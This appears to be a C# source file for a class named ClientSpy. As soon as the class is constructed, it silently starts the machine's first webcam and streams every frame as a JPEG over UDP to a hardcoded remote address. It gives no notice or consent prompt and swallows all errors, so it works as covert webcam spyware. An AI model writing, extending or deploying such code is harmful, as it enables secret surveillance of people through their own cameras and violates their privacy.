using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Sockets;
using AForge.Video;
using AForge.Video.DirectShow;
using Esp.WebCam;


namespace Esp.ClientSpy
{
    public class ClientSpy:IDisposable
    {

        //--------------
        private IPEndPoint _serv;
        private UdpClient udpClient = new UdpClient();
        FilterInfoCollection videoDevice = new FilterInfoCollection(FilterCategory.VideoInputDevice);
        private VideoCaptureDevice videoSource;

        //--------------

        WebCamCapture _wcp;
        private IContainer components;


        public ClientSpy(string iP = "192.168.115.100", string port="48654")
        {
            _serv = new IPEndPoint(IPAddress.Parse(iP),int.Parse(port) );
            videoSource = new VideoCaptureDevice(videoDevice[0].MonikerString);
            videoSource.NewFrame += Start_Sending_Video;
            videoSource.Start();
            //----------------
            components = new Container();


            //_wcp = new WebCamCapture(this);
            //this._wcp.TimeToCapture_milliseconds = 1;
            //this._wcp.Start(0);
   

        }
 
        public async void Start_Sending_Video(object sender, NewFrameEventArgs eventArgs)
        {
            try
            {
                var bmp = new Bitmap(eventArgs.Frame,800,600);
     
                using (var ms = new MemoryStream())
                {
                    bmp.Save(ms,ImageFormat.Jpeg);
                    var bytes = ms.ToArray();
                    await udpClient.SendAsync(bytes, bytes.Length, _serv);
                }
            }
            catch (Exception)
            {
            }
        }

        public void TestRun()
        {
            
        }

        public void Dispose()
        {
            //this._wcp.Stop();
            videoSource.Stop();
        }
    }
}